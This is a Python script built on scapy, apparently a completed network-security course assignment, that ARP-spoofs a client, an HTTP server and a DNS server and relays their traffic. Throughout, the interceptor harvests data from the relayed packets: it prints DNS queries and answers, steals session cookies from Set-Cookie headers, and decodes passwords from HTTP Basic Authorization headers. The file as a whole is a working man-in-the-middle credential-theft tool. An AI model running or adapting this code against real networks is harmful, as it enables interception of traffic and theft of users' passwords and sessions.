from scapy.all import *

import argparse
import sys
import threading
import time
import base64

def parse_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", help="network interface to bind to", required=True)
    parser.add_argument("-ip1", "--clientIP", help="IP of the client", required=True)
    parser.add_argument("-ip2", "--dnsIP", help="IP of the dns server", required=True)
    parser.add_argument("-ip3", "--httpIP", help="IP of the http server", required=True)
    parser.add_argument("-v", "--verbosity", help="verbosity level (0-2)", default=0, type=int)
    return parser.parse_args()


def debug(s):
    global verbosity
    if verbosity >= 1:
        print('#{0}'.format(s))
        sys.stdout.flush()


# TODO: returns the mac address for an IP
def mac(IP):
    arp_packet= Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=IP)
    target_mac= srp(arp_packet, timeout=2, verbose=False)[0][0][1].hwsrc
    return target_mac

#ARP spoofs client, httpServer, dnsServer
def spoof_thread(clientIP, clientMAC, httpServerIP, httpServerMAC, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC, interval=3):
    while True:
        spoof(httpServerIP, attackerMAC, clientIP, clientMAC) # Spoof client ARP table
        spoof(clientIP, attackerMAC, httpServerIP, httpServerMAC) # Spoof httpServer ARP table
        spoof(dnsServerIP, attackerMAC, clientIP, clientMAC) # Spoof client ARP table
        spoof(clientIP, attackerMAC, dnsServerIP, dnsServerMAC) # Spoof dnsServer ARP table
        time.sleep(interval)


# TODO: spoof ARP so that dst changes its ARP table entry for src 
def spoof(src_ip, src_mac, dst_ip, dst_mac):
    debug(f"spoofing {dst_ip}'s ARP table: setting {src_ip} to {src_mac}")
    spoof_packet = ARP(op=2, psrc=src_ip, hwsrc=src_mac, pdst=dst_ip, hwdst=dst_mac)
    send(spoof_packet, verbose=False)


# TODO: restore ARP so that dst changes its ARP table entry for src
def restore(srcIP, srcMAC, dstIP, dstMAC):
    debug(f"restoring ARP table for {dstIP}")
    restore_packet = ARP(op=2, psrc=srcIP, hwsrc=srcMAC, pdst=dstIP, hwdst=dstMAC)
    send(restore_packet, verbose=False)

# TODO: handle intercepted packets
def interceptor(packet):
    global clientMAC, clientIP, httpServerMAC, httpServerIP, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC
    if IP in packet and Ether in packet:
        dst_ip = packet[IP].dst
        dst_mac = packet[Ether].dst
        if dst_ip == clientIP and dst_mac == attackerMAC:
            if DNS in packet:
                print('*hostaddr:{0}'.format(packet[DNS].an.rdata))
            if packet.haslayer(Raw):
                lines = packet.load.decode('utf-8').split('\r\n')
                for line in lines:
                    start_str = 'Set-Cookie: session='
                    if line.startswith(start_str):
                        session_cookie = line[len(start_str):]
                        print('*cookie:{0}'.format(session_cookie))
            packet[Ether].src = attackerMAC
            packet[Ether].dst = clientMAC
            sendp(packet)
        elif dst_ip == httpServerIP and dst_mac == attackerMAC:
            if packet.haslayer(Raw):
                lines = packet.load.decode('utf-8').split('\r\n')
                for line in lines:
                    start_str = 'Authorization: Basic '
                    if line.startswith(start_str):
                        password = base64.b64decode(line[len(start_str):]).decode('utf-8').split(':')[1]
                        print('*basicauth:{0}'.format(password))
            packet[Ether].src = attackerMAC
            packet[Ether].dst = httpServerMAC
            sendp(packet)
        elif dst_ip == dnsServerIP and dst_mac == attackerMAC:
            if DNS in packet:
                print('*hostname:{0}'.format(packet[DNS].qd.qname[:-1].decode('utf-8')))
            packet[Ether].src = attackerMAC
            packet[Ether].dst = dnsServerMAC
            sendp(packet)

            
if __name__ == "__main__":
    args = parse_arguments()
    verbosity = args.verbosity
    if verbosity < 2:
        conf.verb = 0 # minimize scapy verbosity
    conf.iface = args.interface # set default interface

    clientIP = args.clientIP
    httpServerIP = args.httpIP
    dnsServerIP = args.dnsIP
    attackerIP = get_if_addr(args.interface)

    clientMAC = mac(clientIP)
    httpServerMAC = mac(httpServerIP)
    dnsServerMAC = mac(dnsServerIP)
    attackerMAC = get_if_hwaddr(args.interface)

    # start a new thread to ARP spoof in a loop
    spoof_th = threading.Thread(target=spoof_thread, args=(clientIP, clientMAC, httpServerIP, httpServerMAC, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC), daemon=True)
    spoof_th.start()

    # start a new thread to prevent from blocking on sniff, which can delay/prevent KeyboardInterrupt
    sniff_th = threading.Thread(target=sniff, kwargs={'prn':interceptor}, daemon=True)
    sniff_th.start()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        restore(clientIP, clientMAC, httpServerIP, httpServerMAC)
        restore(clientIP, clientMAC, dnsServerIP, dnsServerMAC)
        restore(httpServerIP, httpServerMAC, clientIP, clientMAC)
        restore(dnsServerIP, dnsServerMAC, clientIP, clientMAC)
        sys.exit(1)

    restore(clientIP, clientMAC, httpServerIP, httpServerMAC)
    restore(clientIP, clientMAC, dnsServerIP, dnsServerMAC)
    restore(httpServerIP, httpServerMAC, clientIP, clientMAC)
    restore(dnsServerIP, dnsServerMAC, clientIP, clientMAC)

